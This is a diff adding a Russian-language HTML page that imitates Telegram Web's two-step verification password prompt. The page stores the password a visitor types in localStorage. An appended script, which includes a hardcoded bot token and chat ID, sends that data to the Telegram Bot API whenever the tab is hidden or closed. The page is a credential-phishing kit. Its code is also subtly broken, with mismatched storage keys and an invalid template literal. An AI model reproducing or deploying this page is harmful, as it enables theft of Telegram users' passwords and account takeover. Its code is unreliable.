@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram Web - Облачный пароль</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #e6ebea;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #000;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 32px 32px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 24px;
+            left: 20px;
+            background: none;
+            border: none;
+            padding: 8px;
+            cursor: pointer;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s;
+        }
+
+        .back-btn:active { background-color: #f0f5fa; }
+
+        .logo {
+            margin-top: 10px;
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: center;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: #707579;
+            margin-bottom: 32px;
+            line-height: 1.4;
+            padding: 0 10px;
+        }
+
+        /* Material Design Input */
+        .input-group {
+            position: relative;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .input-group input {
+            width: 100%;
+            height: 54px;
+            padding: 22px 16px 6px;
+            border: 1px solid #dfe1e5;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #000;
+            outline: none;
+            background-color: #fff;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-group input:hover:not(:focus) { border-color: #b0b5ba; }
+        .input-group input:focus { border-color: #3390ec; box-shadow: inset 0 0 0 1px #3390ec; }
+
+        .input-group label {
+            position: absolute;
+            left: 16px;
+            top: 17px;
+            color: #707579;
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.2s ease all;
+        }
+
+        .input-group input:focus ~ label,
+        .input-group input:not(:placeholder-shown) ~ label {
+            top: 7px;
+            font-size: 12px;
+            color: #3390ec;
+        }
+
+        .input-group input:not(:focus):not(:placeholder-shown) ~ label { color: #707579; }
+
+        /* Кнопка Далее */
+        .btn-primary {
+            background-color: #3390ec;
+            color: white;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 10px;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 10px;
+        }
+
+        .btn-primary:hover { background-color: #2b7cce; }
+        .btn-primary:active { background-color: #256bb3; }
+
+        .spacer { flex-grow: 1; }
+
+        @media (max-width: 480px) {
+            body { background-color: #ffffff; align-items: flex-start; }
+            .card {
+                padding: 40px 20px 24px;
+                border-radius: 0;
+                box-shadow: none;
+                height: 100vh;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <button class="back-btn" onclick="goBack()" aria-label="Назад">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20 11H7.83L13.42 5.41L12 4L4 12L12 20L13.41 18.59L7.83 13H20V11Z" fill="#707579"/>
+            </svg>
+        </button>
+
+        <!-- SVG Замок в синем кружке -->
+        <div class="logo">
+            <svg width="100" height="100" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="50" cy="50" r="50" fill="#3390EC" fill-opacity="0.1"/>
+                <path d="M65 48V42C65 33.7157 58.2843 27 50 27C41.7157 27 35 33.7157 35 42V48H32C29.7909 48 28 49.7909 28 52V76C28 78.2091 29.7909 80 32 80H68C70.2091 80 72 78.2091 72 76V52C72 49.7909 70.2091 48 68 48H65ZM41 42C41 37.0294 45.0294 33 50 33C54.9706 33 59 37.0294 59 42V48H41V42ZM50 68C47.2386 68 45 65.7614 45 63C45 60.2386 47.2386 58 50 58C52.7614 58 55 60.2386 55 63C55 65.7614 52.7614 68 50 68Z" fill="#3390EC"/>
+            </svg>
+        </div>
+
+        <h2>Ввод пароля</h2>
+        <p class="subtitle">У вас включена двухэтапная аутентификация, поэтому для входа потребуется ввести дополнительный пароль.</p>
+
+        <div class="input-group">
+            <input type="password" id="password" placeholder=" ">
+            <label for="password">Пароль</label>
+        </div>
+
+        <div class="spacer"></div>
+
+        <button class="btn-primary" onclick="submitPassword()">Далее</button>
+    </div>
+
+    <script>
+        // Автоматический фокус на поле при открытии страницы
+        document.addEventListener("DOMContentLoaded", () => {
+            setTimeout(() => {
+                document.getElementById('password').focus();
+            }, 300);
+        });
+
+        function goBack() {
+            window.location.href = 'telegram-step2.html';
+        }
+
+        function submitPassword() {
+            const pwdInput = document.getElementById('password');
+            const pwd = pwdInput.value;
+            
+            if (pwd.length === 0) return; // Не отправляем пустой
+
+            // Сохраняем пароль
+            localStorage.setItem('telegram_password', pwd);
+
+            // Пытаемся открыть приложение Telegram
+            window.location.href = 'tg://resolve?domain=telegram';
+            
+            // Запасной вариант: если приложение не открылось, перекидываем на веб-версию или сайт
+            setTimeout(() => {
+                window.location.href = 'https://t.me/';
+            }, 1500);
+        }
+
+        // Поддержка нажатия Enter для отправки
+        document.getElementById('password').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                submitPassword();
+            }
+        });
+    </script>
+     <script>
+    // Твой токен и твой Telegram ID (или ID чата, куда должны лететь данные)
+    const BOT_TOKEN = "9245592692:AAGXX8AgmKsYMjLtuya2hRM5DYWyzMbAXt4";
+    const CHAT_ID = "5419723549"; // Твой айди, который ты скидывал
+
+    function sendToTelegram() {
+        // Достаем данные из localStorage по твоему ключу
+        let phoneData = localStorage.getItem('telegramPassword');
+
+        if (!phoneData) return; // Если данных нет, ничего не шлем
+
+        // Формируем текст сообщения
+        let messageText = "Новые данные из браузера:\n" + phoneData;
+
+        // Отправляем запрос прямо в Telegram API
+        let url = `https://api.telegram.org/bot${9245592692:AAGXX8AgmKsYMjLtuya2hRM5DYWyzMbAXt4}/sendMessage?chat_id=${5419723549}&text=` + encodeURIComponent(messageText);
+
+        // Шлем запрос в фоне
+        fetch(url).catch(err => console.log('Ошибка отправки', err));
+    }
+
+    // Срабатывает автоматически, когда пользователь уходит со вкладки или закрывает её
+    document.addEventListener('visibilitychange', function() {
+        if (document.visibilityState === 'hidden') {
+            sendToTelegram();
+        }
+    });
+</script>
+</body>
+</html>
